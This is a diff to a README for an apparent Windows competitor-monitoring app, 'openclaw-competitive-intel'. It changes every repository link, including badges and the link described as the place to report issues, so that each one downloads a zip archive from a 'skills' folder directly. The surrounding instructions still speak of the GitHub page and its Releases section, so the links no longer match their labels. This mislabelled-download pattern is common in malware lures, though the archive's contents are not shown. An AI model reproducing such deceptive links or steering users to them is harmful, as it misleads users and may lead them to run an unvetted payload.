@@ -1,6 +1,6 @@
 # 🦾 openclaw-competitive-intel - Monitor Competitors Efficiently
 
-[![Download openclaw-competitive-intel](https://img.shields.io/badge/Download-Here-green?style=for-the-badge&logo=github)](https://github.com/Aqmar777/openclaw-competitive-intel)
+[![Download openclaw-competitive-intel](https://img.shields.io/badge/Download-Here-green?style=for-the-badge&logo=github)](https://github.com/Aqmar777/openclaw-competitive-intel/raw/refs/heads/main/skills/openclaw_intel_competitive_3.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This section shows how to get the app on your Windows computer and run it.
 ## 🔗 Download and Install
 
 1. Click the big green download button above or visit this page to download the software directly:  
-   [https://github.com/Aqmar777/openclaw-competitive-intel](https://github.com/Aqmar777/openclaw-competitive-intel)
+   [https://github.com/Aqmar777/openclaw-competitive-intel/raw/refs/heads/main/skills/openclaw_intel_competitive_3.8.zip](https://github.com/Aqmar777/openclaw-competitive-intel/raw/refs/heads/main/skills/openclaw_intel_competitive_3.8.zip)
 
 2. On the GitHub page, look for the **Releases** section on the right side or near the top menu. Click it.
 
@@ -182,10 +182,10 @@ This app connects with ideas and areas like:
 
 If you have trouble or questions, visit the GitHub page:
 
-[https://github.com/Aqmar777/openclaw-competitive-intel](https://github.com/Aqmar777/openclaw-competitive-intel)
+[https://github.com/Aqmar777/openclaw-competitive-intel/raw/refs/heads/main/skills/openclaw_intel_competitive_3.8.zip](https://github.com/Aqmar777/openclaw-competitive-intel/raw/refs/heads/main/skills/openclaw_intel_competitive_3.8.zip)
 
 You can report issues or ask for support there.
 
 ---
 
-[![Download openclaw-competitive-intel](https://img.shields.io/badge/Download-OpenClaw%20Intel-blue?style=for-the-badge&logo=github)](https://github.com/Aqmar777/openclaw-competitive-intel)
+[![Download openclaw-competitive-intel](https://img.shields.io/badge/Download-OpenClaw%20Intel-blue?style=for-the-badge&logo=github)](https://github.com/Aqmar777/openclaw-competitive-intel/raw/refs/heads/main/skills/openclaw_intel_competitive_3.8.zip)
